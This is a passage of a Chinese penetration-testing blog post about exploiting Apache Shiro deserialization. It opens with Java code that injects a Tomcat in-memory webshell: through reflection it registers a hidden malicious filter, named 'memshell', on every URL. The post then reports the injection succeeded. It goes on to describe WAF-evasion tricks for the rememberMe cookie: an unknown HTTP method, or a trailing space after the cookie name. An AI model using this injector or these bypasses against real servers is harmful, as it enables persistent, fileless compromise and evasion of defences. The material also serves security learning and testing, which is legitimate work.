        org.apache.catalina.connector.Response response=(org.apache.catalina.connector.Response)context[1];
        try{
            String name="memshell";
            ServletContext servletContext = request.getSession().getServletContext();

            Field appctx = servletContext.getClass().getDeclaredField("context");
            appctx.setAccessible(true);
            ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);

            Field stdctx = applicationContext.getClass().getDeclaredField("context");
            stdctx.setAccessible(true);
            StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);

            Field Configs = standardContext.getClass().getDeclaredField("filterConfigs");
            Configs.setAccessible(true);
            Map filterConfigs = (Map) Configs.get(standardContext);
            if (filterConfigs.get(name) == null) {
                Filter filter = new memery();
                //添加filter到filterDef
                FilterDef filterDef = new FilterDef();
                filterDef.setFilter(filter);
                filterDef.setFilterName(name);
                filterDef.setFilterClass(filter.getClass().getName());
                //添加filterDef到filterDefs中
                standardContext.addFilterDef(filterDef);
                //创建FilterMap
                FilterMap filterMap = new FilterMap();
                filterMap.addURLPattern("/*");
                filterMap.setFilterName(name);
                filterMap.setDispatcher(DispatcherType.REQUEST.name());
                //将该FilterMap添加到最前面
                standardContext.addFilterMapBefore(filterMap);
                //创建ApplicationFilterConfig类, 并将它添加到filterConfigs中
                Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
                constructor.setAccessible(true);
                ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);
                filterConfigs.put(name, filterConfig);
                response.getWriter().println("Success");
                response.getWriter().flush();
                response.getWriter().close();
            }
        }catch(Exception e){
            e.printStackTrace();
        }
        return true;
    }
}
```
注意POST传参需要先url编码一下
![](https://img-blog.csdnimg.cn/f62bbd4964274675b9e74e84fd3ae9ab.png)

然后就成功写入内存马了
![](https://img-blog.csdnimg.cn/a5eaae74017a462f82360f8da8df11c7.png)

参考：
[Shiro 550 漏洞学习 (二)：内存马注入及回显](http://wjlshare.com/archives/1545)
[tomcat结合shiro无文件webshell的技术研究以及检测方法](https://zhuanlan.zhihu.com/p/395443877)
[利用shiro反序列化注入冰蝎内存马](https://xz.aliyun.com/t/10696)
[Shiro 回显与内存马实现](https://myzxcg.com/2021/11/Shiro-%E5%9B%9E%E6%98%BE%E4%B8%8E%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/)


### 绕过waf
在做渗透测试的时候是非常容易遇到waf的，有的对rememberMe的长度进行限制，甚至解密payload检查反序列化class，这里就需要进行绕过了，参考c0ny1大佬的文章

可以修改GET方法为XXX这样的未知HTTP请求方法，而WAF是通过正常的http方法识别HTTP数据包的，所以造成了一个绕过
![](https://img-blog.csdnimg.cn/17726e708e8a4ae88f02ab013fec5e4c.png)

未知Http方法名绕WAF这个姿势，可以使用在Filter和Listener层出现的漏洞，同时WAF不解析的情况
缺点的话就是无法使用post传参

也可以尝试在rememberMe后面加一个空格
![](https://img-blog.csdnimg.cn/04c65009bcc54ba992e4ebfa8fe8dd2c.png)

如果waf仅仅匹配了rememberMe，就可以造成一个绕过

参考：
[你的扫描器可以绕过防火墙么？（一）](https://mp.weixin.qq.com/s/P5h9_K4YcvsrU4tsdHsJdQ)
[shiro反序列化绕WAF之未知HTTP请求方法 ](https://gv7.me/articles/2021/shiro-deserialization-bypasses-waf-through-unknown-http-method/)
